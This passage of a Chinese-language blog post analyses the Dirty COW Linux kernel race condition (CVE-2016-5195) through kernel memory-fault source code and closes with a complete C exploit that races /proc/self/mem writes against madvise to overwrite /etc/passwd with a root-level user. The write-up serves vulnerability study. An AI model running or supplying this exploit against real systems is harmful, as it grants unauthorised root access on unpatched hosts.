class="keyword">int</span> foll_flags = gup_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_increm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line"><span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">vma = find_extend_vma(mm, start);</span><br><span class="line"><span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">gup_flags, &amp;vma,</span><br><span class="line">pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> i ? : ret;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line"><span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">&amp;start, &amp;nr_pages, i,</span><br><span class="line">gup_flags);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment"> * potentially allocating memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line"><span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">cond_resched();</span><br><span class="line">      page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">nonblocking);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"><span class="keyword">case</span> -EFAULT:</span><br><span class="line"><span class="keyword">case</span> -ENOMEM:</span><br><span class="line"><span class="keyword">case</span> -EHWPOISON:</span><br><span class="line"><span class="keyword">return</span> i ? i : ret;</span><br><span class="line"><span class="keyword">case</span> -EBUSY:</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line"><span class="keyword">case</span> -ENOENT:</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line">BUG();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment"> * struct page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line"><span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pages) &#123;</span><br><span class="line">pages[i] = page;</span><br><span class="line">flush_anon_page(vma, page, start);</span><br><span class="line">flush_dcache_page(page);</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">next_page:</span><br><span class="line"><span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">vmas[i] = vma;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line"><span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">page_increm = nr_pages;</span><br><span class="line">i += page_increm;</span><br><span class="line">start += page_increm * PAGE_SIZE;</span><br><span class="line">nr_pages -= page_increm;</span><br><span class="line">&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure><p>最开始就是对vma的一些操作，我们需要注意的是<code>retry</code>之后的内容。可以看出来的是<code>follow_page_mask</code>函数返回的是物理页面，而且<code>faultin_page</code>函数中会调用<code>handle_mm_fault</code>。</p><p>那么我们在第一次往一个文件中写入内容时会因为Linux的延迟绑定机制导致该页还未和对应的物理页建立映射，那么此时<code>follow_page_mask</code>函数返回的则是NULL，随即进入第一个<code>faultin_page</code>函数，根据前面的分析，这一次解决完毕之后，会分配物理页。那么这里经过<code>retry</code>再一次执行<code>follow_page_mask</code>，不过因为页面不可写再一次导致返回的值为NULL，随即进行第二次<code>faultin_page</code>函数，进行写时复制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">(stack_guard_page_start(vma, address) ||</span><br><span class="line"> stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line"><span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">BUG();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tsk) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">*nonblocking = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment"> * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment"> * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment"> * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment"> * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment"> * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次进入时，返回的是一个可写的内存页了，并且返回值为<code>VM_FAULT_WRITE</code>，所以会执行到上面的最后一段，所以会清除掉<code>flag</code>中的<code>FOLL_WRITE</code>。那么在下一次调用<code>follow_page_pte</code>函数时则会返回正常的内存页了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在分析之前，首先看一下<code>madvise</code>系统调用，<code>madvise</code>一共有三个参数，第一个参数为地址，第二参数为范围，第三个参数为行为。而这个函数的作用就是建议内核，在从 addr 指定的地址开始，长度等于 len 参数值的范围内，该区域的用户虚拟内存应遵循特定的使用模式。内核使用这些信息优化与指定范围关联的资源的处理和维护过程。而其中存在一个<code>MADV_DONTNEED</code>参数我所理解的就是去除对应的表项，并且被内核标记，在被需要时可以被重新使用。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次聚焦<code>do_fault</code>函数，可以看到这一次我们的flags其实是没有<code>FAULT_FLAG_WRITE</code>标志位的，所以会直接调用<code>do_read_fault</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_read_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span></span><br><span class="line"><span class="comment"> * if page by the offset is not ready to be mapped (cold cache or</span></span><br><span class="line"><span class="comment"> * something).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="number">1</span>) &#123;</span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">do_fault_around(vma, address, pte, pgoff, flags);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*pte, orig_pte))</span><br><span class="line"><span class="keyword">goto</span> unlock_out;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, <span class="literal">NULL</span>, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, fault_page, pte, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">unlock_out:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>do_set_pte(vma, address, fault_page, pte, false, false);</code>函数调用，在<code>do_cow_fault</code>函数中同样存在这样的调用<code>do_set_pte(vma, address, new_page, pte, true, true);</code>。可以发现第三个参数也就决定了后面可以获取到的页面，而<code>do_read_fault</code>这里获取的直接就是<code>fault_page</code>，这里就是很简单粗暴的将其移出<code>page_cache</code>，这是因为kernel在面对一个读请求时不会大费周章的再去创建一个<code>dirty COW</code>页。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>使用两个线程跑竞争，在第一个线程完成两次缺页异常的流程之后，第二个线程调用<code>madvise()</code>系统调用将内存页调出，那么第一个线程在尝试第三次获取内存页时便无法正常获取到可读的物理页，此时会再次出发缺页异常，接下来会有一次进入到<code>faultin_page()</code>函数中，而这次返回的内存页其实就是<code>fault_page</code>，并且这个内存页也是不可写状态的，但是在上面的flag中，我们已经去除掉了<code>FOLL_WRITE</code>所以在内核眼中，这是一块用来读的内存页，所以会正常返回处内存页，但是在<code>access_remote_vm</code>中判断读写使用的是<code>write</code>变量，所以实际上我们依旧是在往内部进行写，至此成功实现了越权写。</p><h2 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">char</span> *fake_user;</span><br><span class="line"><span class="keyword">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *username;</span><br><span class="line">    <span class="keyword">char</span> *hash;</span><br><span class="line">    <span class="keyword">int</span> user_id;</span><br><span class="line">    <span class="keyword">int</span> group_id;</span><br><span class="line">    <span class="keyword">char</span> *info;</span><br><span class="line">    <span class="keyword">char</span> *home_dir;</span><br><span class="line">    <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">info</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .user_id = <span class="number">0</span>,</span><br><span class="line">        .group_id = <span class="number">0</span>,</span><br><span class="line">        .info = <span class="string">&quot;196082&quot;</span>,</span><br><span class="line">        .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">        .shell = <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="keyword">off_t</span>)<span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info.username = argv[<span class="number">1</span>];</span><br><span class="line">    info.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">                                info.username,</span><br><span class="line">                                info.hash,</span><br><span class="line">                                info.user_id,</span><br><span class="line">                                info.group_id,</span><br><span class="line">                                info.info,</span><br><span class="line">                                info.home_dir,</span><br><span class="line">                                info.shell);</span><br><span class="line">    fake_user = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">            info.username,</span><br><span class="line">            info.hash,</span><br><span class="line">            info.user_id,</span><br><span class="line">            info.group_id,</span><br><span class="line">            info.info,</span><br><span class="line">            info.home_dir,</span><br><span class="line">            info.shell);</span><br><span class="line"></span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st);</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p>​<a class="link"   href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/" >https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://elixir.bootlin.com/linux/v4.4/source" >https://elixir.bootlin.com/linux/v4.4/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
